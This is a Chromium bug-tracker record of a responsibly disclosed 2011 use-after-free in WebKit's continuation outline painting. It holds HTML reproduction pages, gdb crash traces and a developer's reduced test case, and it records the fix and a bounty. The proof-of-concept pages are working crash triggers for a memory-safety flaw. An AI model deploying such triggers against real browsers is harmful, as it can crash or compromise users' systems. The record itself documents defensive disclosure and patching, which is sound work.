# Stale continuation flow pointer for ContinuationOutlineTableMap

| Field | Value |
|-------|-------|
| **Issue ID** | [40087599](https://issues.chromium.org/issues/40087599) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-02-05 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

When performing certain DOM operations while quickly switching between documents by setting window.location chromium will crash in WebCore::RenderObject::containingBlock. The crash is usually a null pointer dereference on a call (or callq) instruction with the narrowed version of the reproduction case, but under certain circumstances will crash at a different address or on instruction fetch at null.

The reproduction case contains two html files, crash.html and dummy.html. It is possible for a crash to occur if crash.html keeps reloading itself, but it is far more reliable when switching between crash.html and dummy.html. A raw reproduction case is not included here because in this case it seems to be less reliable than than the narrowed case. I was only able to reproduce the crash with the raw case on Ubuntu 10.10 32-bit. Also note that it can take a few seconds for the crash to trigger. If you are unable to reproduce the crash using this reproduction case let me know and I will try to find a reliable raw case.

**VERSION**  

Tested in Chromium 8.0.552.237 Ubuntu 10.04 (64-bit), Chromium 8.0.552.237 Ubuntu 10.10 (32-bit), Google Chrome 9.0.597.84 stable (Ubuntu 10.04 64-bit), and 11.0.659.0 canary build (Windows Vista SP2 64-bit). Debugging was done with Chromium 8.0.552.237 Ubuntu 10.04 (64-bit).

**REPRODUCTION CASE**  

crash.html:

<html>
<head><title>WebCore::RenderObject::containingBlock Crash</title></head>
<body onload="boom();">
<script type="text/javascript">
function boom() {
table = document.createElement('table');
document.body.appendChild(table);
multicol = document.createElement('multicol');
multicol.style.outlineStyle = 'ridge';
multicol.appendChild(document.createTextNode('yyyyyy'));
range = document.createElement('range');
multicol.appendChild(range);
table.appendChild(multicol);
spacer = document.createElement('spacer');
q = document.createElement('q');
q.style.display = 'list-item';
range.appendChild(q);
document.body.offsetTop;
range.parentNode.removeChild(range);
spacer.insertBefore(range, spacer.lastChild);
setTimeout('window.location = "dummy.html";', 50);
}
</script>
</body>
</html>

dummy.html:

<html>
<head><title>Dummy page to facilitate crash</title></head>
<body onload="setTimeout('window.location = \'crash.html\'', 10);">
<h1>blahblahblah</h1>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

The following is a shortened version of the trace through the program in gdb. The full version as well as the reproduction cases are attached.

$ chromium-browser --debug --single-process crash.html

# Env:

# LD\_LIBRARY\_PATH=/usr/lib/chromium-browser

# PATH=/usr/lib/chromium-browser:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games

# GTK\_PATH=

# CHROMIUM\_USER\_FLAGS=

# CHROMIUM\_FLAGS=

/usr/bin/gdb /usr/lib/chromium-browser/chromium-browser -x /tmp/chromiumargs.EAdyYu  

GNU gdb (GDB) 7.1-ubuntu  

Copyright (C) 2010 Free Software Foundation, Inc.  

License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>  

This is free software: you are free to change and redistribute it.  

There is NO WARRANTY, to the extent permitted by law. Type "show copying"  

and "show warranty" for details.  

This GDB was configured as "x86\_64-linux-gnu".  

For bug reporting instructions, please see:  

<http://www.gnu.org/software/gdb/bugs/>...  

Reading symbols from /usr/lib/chromium-browser/chromium-browser...Reading symbols from /usr/lib/debug/usr/lib/chromium-browser/chromium-browser...done.  

done.  

(gdb) run

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe3c45700 (LWP 3238)]  

0x00007ffff694bbe0 in WebCore::RenderObject::containingBlock (  

this=0x7ffff8f61940)  

at third\_party/WebKit/WebCore/rendering/RenderObject.cpp:622  

622 third\_party/WebKit/WebCore/rendering/RenderObject.cpp: No such file or directory.  

in third\_party/WebKit/WebCore/rendering/RenderObject.cpp  

(gdb) bt  

#0 0x00007ffff694bbe0 in WebCore::RenderObject::containingBlock (  

this=0x7ffff8f61940)  

at third\_party/WebKit/WebCore/rendering/RenderObject.cpp:622  

#1 0x00007ffff68d8774 in WebCore::RenderBlock::paintContinuationOutlines (  

this=0x7ffff8f61810, info=<value optimized out>, tx=8, ty=8)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:2522  

#2 0x00007ffff68e67d1 in WebCore::RenderBlock::paintObject (  

this=0x7ffff8f61810, paintInfo=..., tx=8, ty=8)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:2404  

#3 0x00007ffff68db800 in WebCore::RenderBlock::paint (this=0x7ffff8f61810,  

paintInfo=..., tx=8, ty=8)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:2144  

#4 0x00007ffff68d7bf2 in WebCore::RenderBlock::paintChildren (  

this=0x7ffff8f61750, paintInfo=..., tx=<value optimized out>, ty=8)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:2295  

#5 0x00007ffff68e65ba in WebCore::RenderBlock::paintObject (  

this=0x7ffff8f61750, paintInfo=..., tx=8, ty=8)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:2362  

#6 0x00007ffff68db800 in WebCore::RenderBlock::paint (this=0x7ffff8f61750,  

paintInfo=..., tx=8, ty=8)

(gdb) disassemble  

Dump of assembler code for function \_ZNK7WebCore12RenderObject15containingBlockEv:  

0x00007ffff694bbd0 <+0>: push %rbp  

0x00007ffff694bbd1 <+1>: mov %rdi,%rbp  

0x00007ffff694bbd4 <+4>: push %rbx  

0x00007ffff694bbd5 <+5>: sub $0x8,%rsp  

0x00007ffff694bbd9 <+9>: mov 0x0(%rbp),%rax  

0x00007ffff694bbdd <+13>: mov %rbp,%rdi  

=> 0x00007ffff694bbe0 <+16>: callq \*0x1a0(%rax)  

0x00007ffff694bbe6 <+22>: test %al,%al  

0x00007ffff694bbe8 <+24>: jne 0x7ffff694bdf8 <\_ZNK7WebCore12RenderObject15containingBlockEv+552>  

0x00007ffff694bbee <+30>: mov 0x0(%rbp),%rax  

0x00007ffff694bbf2 <+34>: mov %rbp,%rdi  

0x00007ffff694bbf5 <+37>: callq \*0x160(%rax)  

0x00007ffff694bbfb <+43>: test %al,%al  

0x00007ffff694bbfd <+45>: jne 0x7ffff694be28 <\_ZNK7WebCore12RenderObject15containingBlockEv+600>  

0x00007ffff694bc03 <+51>: testb $0x4,0x31(%rbp)  

0x00007ffff694bc07 <+55>: mov 0x18(%rbp),%rbx  

0x00007ffff694bc0b <+59>: jne 0x7ffff694bc20 <\_ZNK7WebCore12RenderObject15containingBlockEv+80>  

0x00007ffff694bc0d <+61>: nopl (%rax)  

---Type <return> to continue, or q <return> to quit---q  

Quit  

(gdb) i r  

rax 0x0 0  

rbx 0x8 8  

rcx 0x7ffff8f61810 140737370265616  

rdx 0x7ffff90a3c90 140737371585680  

rsi 0x7fffe3c43aa0 140737014676128  

rdi 0x7ffff8f61940 140737370265920  

rbp 0x7ffff8f61940 0x7ffff8f61940  

rsp 0x7fffe3c43930 0x7fffe3c43930  

r8 0x3f 63  

r9 0x5 5  

r10 0x8 8  

r11 0xae 174  

r12 0x7ffff8f61810 140737370265616  

r13 0x7ffffbc36410 140737417274384  

r14 0x7ffff8f61940 140737370265920  

r15 0x7ffffb4eab00 140737409624832  

rip 0x7ffff694bbe0 0x7ffff694bbe0 <WebCore::RenderObject::containingBlock() const+16>  

eflags 0x10206 [ PF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

---Type <return> to continue, or q <return> to quit---  

fs 0x0 0  

gs 0x0 0  

(gdb)

Though the above is the usual case for a crash, as mentioned previously it will occasionally crash on instruction fetch. The following shows an example of that on Ubuntu 10.10 32-bit.

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0xb1646b70 (LWP 2042)]  

0x00000000 in ?? ()  

(gdb) frame 1  

#1 0x019456c6 in WebCore::RenderObject::containingBlock (this=0x33be2a0)  

at third\_party/WebKit/WebCore/rendering/RenderObject.cpp:622  

622 third\_party/WebKit/WebCore/rendering/RenderObject.cpp: No such file or directory.  

in third\_party/WebKit/WebCore/rendering/RenderObject.cpp  

(gdb) disas  

Dump of assembler code for function WebCore::RenderObject::containingBlock() const:  

0x019456b0 <+0>: push %ebp  

0x019456b1 <+1>: mov %esp,%ebp  

0x019456b3 <+3>: push %edi  

0x019456b4 <+4>: push %esi  

0x019456b5 <+5>: sub $0x10,%esp  

0x019456b8 <+8>: mov 0x8(%ebp),%edi  

0x019456bb <+11>: mov (%edi),%eax  

0x019456bd <+13>: mov %edi,(%esp)  

0x019456c0 <+16>: call \*0xd0(%eax)  

=> 0x019456c6 <+22>: test %al,%al

## Attachments

- [dummy.html](attachments/dummy.html) (text/html; charset=us-ascii, 172 B)
- [crash.html](attachments/crash.html) (text/html; charset=us-ascii, 819 B)
- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 10.3 KB)
- [test2.html](attachments/test2.html) (text/html; charset=us-ascii, 802 B)

## Timeline

### in...@chromium.org (2011-02-07)

Yes, it is clearly freed. ContinuationOutlineTableMap is holding a stale renderinline continuation flow object. It only reproduces on the release builds :(.

### ma...@gmail.com (2011-02-07)

That does seem to be the case. I tried out my raw reproduction cases in trunk (r73972) and I have been unable to reproduce the crash.

### ma...@gmail.com (2011-02-09)

To elaborate on that last comment a bit, that was with trunk and a debugging build. It does still seem to crash in trunk with the release build. Is there anything in particular that you can think of that might be causing this?

### in...@chromium.org (2011-02-15)

More reduced testcase that reproduces on windows canary, does not need dependency and i just cleared some tag names

<html>
<body onload = "runTest();">
<script type="text/javascript">
function runTest() {
    table = document.createElement('table');
    document.body.appendChild(table);
    junk1 = document.createElement('junk1');
    junk1.style.outlineStyle = 'solid';

    junk1.appendChild(document.createTextNode('yyyyyy'));
    junk2 = document.createElement('junk2');
    junk1.appendChild(junk2);

    table.appendChild(junk1);

    junk4 = document.createElement('junk4');
    junk4.style.display = 'list-item';
    junk2.appendChild(junk4);
    document.body.offsetTop;
    junk1.removeChild(junk2);

    junk3 = document.createElement('junk3');
    junk3.insertBefore(junk2, null);
    
    setTimeout('window.location = "does_not_exist.html";', 0);
}
</script>
</body>
</html>

### in...@chromium.org (2011-02-18)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-02-24)

about to upload new patch. webkit bug - https://bugs.webkit.org/show_bug.cgi?id=54690

### in...@chromium.org (2011-02-25)

Committed r79734: <http://trac.webkit.org/changeset/79734>

### js...@chromium.org (2011-02-28)

[Empty comment from Monorail migration]

### ch...@gmail.com (2011-02-28)

merged to m10 as http://trac.webkit.org/changeset/79911

### sc...@gmail.com (2011-03-02)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-03)

@MartyBarbella: another great report and another provisional $1000 reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-03-10)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-03-15)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/72028?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40087599)*
